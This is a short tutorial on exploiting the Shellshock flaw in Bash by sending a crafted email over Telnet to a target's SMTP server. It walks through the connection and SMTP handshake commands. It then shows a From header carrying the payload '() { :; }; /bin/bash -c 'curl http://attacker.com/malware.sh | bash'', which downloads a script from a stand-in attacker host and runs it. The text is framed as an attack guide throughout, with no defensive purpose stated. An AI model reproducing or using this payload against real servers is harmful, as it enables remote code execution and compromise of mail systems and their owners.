1.Crafting the Exploit through an Email using Telnet

You can use Telnet to manually send an email to the target server with a malicious header or body. Here's how to do it:
Step 1: Connect to the Mail Server

Using Telnet, connect to the SMTP server of the target:

telnet vulnerable-server.com 25

- Replace vulnerable-server.com with the target's domain or IP address.
- Port 25 is commonly used for SMTP, but it could also be 587 (submission) or 465 (secure SMTP).

Step 2: Initiate the SMTP Communication

After connecting, perform the SMTP handshake:

EHLO attacker.com
MAIL FROM:<attacker@malicious.com>
RCPT TO:<target@vulnerable-server.com>
DATA

Step 3: Inject the Shellshock Payload

Construct the email with malicious content. The payload can be injected into headers like From, Subject, or User-Agent, or even in the email body.

Example: Exploiting with a Malicious Header

From: "Exploiter" <() { :; }; /bin/bash -c 'curl http://attacker.com/malware.sh | bash'>
Subject: Vulnerable Email Test

This is a test email to exploit Shellshock.
.

Explanation:

    The From header contains the Shellshock payload:
    () { :; }; /bin/bash -c 'curl http://attacker.com/malware.sh | bash'
    The payload instructs Bash to download and execute a script from the attacker's server.


Step 4: Send the Email

Complete the email transmission with a single period (.) on a new line:
